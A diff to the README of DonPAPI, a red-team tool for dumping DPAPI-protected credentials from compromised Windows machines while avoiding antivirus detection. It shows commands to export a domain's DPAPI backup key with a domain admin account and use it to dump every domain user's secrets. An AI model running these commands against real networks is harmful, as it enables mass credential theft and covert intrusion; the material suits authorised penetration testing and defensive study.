@@ -1,5 +1,6 @@
 # DonPAPI
 Dumping relevant information on compromised targets without AV detection
+![alt text](https://github.com/login-securite/DonPAPI/blob/main/res/Logo%20DonPapi.png)
 
 ## Installation 
 
@@ -17,6 +18,8 @@ DonPAPI -h
 ```bash
 pip install DonPAPI
 ```
+Dumping revelant information on compromised targets without AV detection
+
 
 ## DPAPI dumping
 Lots of credentials are protected by [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection).
@@ -99,10 +102,10 @@ DonPAPI -credz credz_file.txt domain/user:passw0rd@target
 When a domain admin user is available, it is possible to dump the domain backup key using impacket `dpapi.py` tool. 
 
 ```bash
-dpapi.py backupkey --export
+dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip
 ```
 
-This backup key can then be used to dump all domain user's secrets!
+This backup key (pvk file) can then be used to dump all domain user's secrets!
 
 `python DonPAPI -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list`
 
